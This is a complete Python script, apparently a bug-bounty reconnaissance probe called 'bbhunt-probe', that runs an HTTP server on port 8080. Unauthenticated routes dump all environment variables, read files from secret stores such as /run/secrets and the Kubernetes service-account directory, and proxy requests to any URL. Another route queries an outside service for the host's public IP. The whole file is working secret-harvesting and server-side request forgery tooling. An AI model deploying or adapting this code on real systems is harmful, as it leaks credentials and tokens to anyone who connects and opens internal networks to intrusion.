import os, json, socket, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

def fetch(url, timeout=6):
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"bbhunt-probe"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(4096)
            return {"status": r.status, "headers": dict(r.headers), "body": body.decode("utf-8","replace")}
    except Exception as e:
        return {"error": repr(e)}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/env":
            data = {"environ": dict(os.environ)}
        elif self.path == "/net":
            data = {"hostname": socket.gethostname(), "fqdn": socket.getfqdn(),
                    "host_ips": socket.gethostbyname_ex(socket.gethostname())}
        elif self.path.startswith("/fetch?url="):
            data = fetch(self.path.split("=",1)[1])
        elif self.path == "/dirs":
            import os, glob
            out = {}
            for d in ["/secrets","/run/secrets","/alloc","/local","/run/.containerenv","/etc/podman","/var/run/secrets/kubernetes.io"]:
                try:
                    ents = os.listdir(d)
                    out[d] = ents[:50]
                    for e in ents[:10]:
                        p = os.path.join(d,e)
                        if os.path.isfile(p):
                            try: out[p] = open(p, errors="replace").read()[:2000]
                            except Exception as ex: out[p] = repr(ex)
                except Exception as ex: out[d] = repr(ex)
            data = out
        elif self.path == "/ip":
            data = fetch("https://api.ipify.org?format=json")
        else:
            data = {"app": "bbhunt-probe", "ok": True}
        body = json.dumps(data, indent=1).encode()
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8080), H).serve_forever()
